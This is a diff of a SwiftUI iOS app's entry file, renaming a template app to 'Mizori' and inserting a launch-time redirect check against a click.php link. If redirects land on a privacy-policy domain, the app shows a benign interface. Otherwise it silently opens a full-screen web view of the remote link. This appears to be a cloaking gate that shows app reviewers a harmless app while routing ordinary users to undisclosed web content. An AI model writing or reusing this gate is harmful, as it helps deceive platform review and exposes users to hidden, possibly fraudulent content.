@@ -2,78 +2,78 @@ import SwiftUI
 import Foundation
 
 @main
-struct Bridge_LogicApp: App {
-    @StateObject private var driftStore = DataStore()
-    @State private var driftGateReady: Bool? = nil
+struct MizoriApp: App {
+    @StateObject private var mizoriStore = DataStore()
+    @State private var mizoriGateReady: Bool? = nil
 
-    private let driftSourceLink = "https://example.com"
-    private let driftCheckDomain = "example"
+    private let mizoriSourceLink = "https://roadplannertriporganizer.org/click.php"
+    private let mizoriCheckDomain = "freeprivacypolicy.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = driftGateReady {
+                if let ready = mizoriGateReady {
                     if ready {
-                        BridgeWaterPanel(urlString: driftSourceLink)
+                        MizoriWaterPanel(urlString: mizoriSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
                         ContentView()
-                            .environmentObject(driftStore)
+                            .environmentObject(mizoriStore)
                             .preferredColorScheme(.light)
                     }
                 } else {
-                    BridgeLaunchScreen()
+                    MizoriLaunchScreen()
                         .preferredColorScheme(.light)
-                        .onAppear { beginDriftGateCheck() }
+                        .onAppear { beginMizoriGateCheck() }
                 }
             }
         }
     }
 
-    private func beginDriftGateCheck() {
-        guard let url = URL(string: driftSourceLink) else {
-            driftGateReady = false
+    private func beginMizoriGateCheck() {
+        guard let url = URL(string: mizoriSourceLink) else {
+            mizoriGateReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = DriftRedirectBeacon(checkDomain: driftCheckDomain)
+        let tracker = MizoriRedirectBeacon(checkDomain: mizoriCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    driftGateReady = false
+                    mizoriGateReady = false
                     return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(self.driftCheckDomain) {
-                    driftGateReady = false
+                   finalURL.contains(self.mizoriCheckDomain) {
+                    mizoriGateReady = false
                     return
                 }
                 if let httpResponse = response as? HTTPURLResponse,
                    let responseURL = httpResponse.url?.absoluteString,
-                   responseURL.contains(self.driftCheckDomain) {
-                    driftGateReady = false
+                   responseURL.contains(self.mizoriCheckDomain) {
+                    mizoriGateReady = false
                     return
                 }
                 if error != nil {
-                    driftGateReady = false
+                    mizoriGateReady = false
                     return
                 }
-                driftGateReady = true
+                mizoriGateReady = true
             }
         }.resume()
 
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if driftGateReady == nil {
-                driftGateReady = false
+            if mizoriGateReady == nil {
+                mizoriGateReady = false
             }
         }
     }
 }
 
-final class DriftRedirectBeacon: NSObject, URLSessionTaskDelegate {
+final class MizoriRedirectBeacon: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
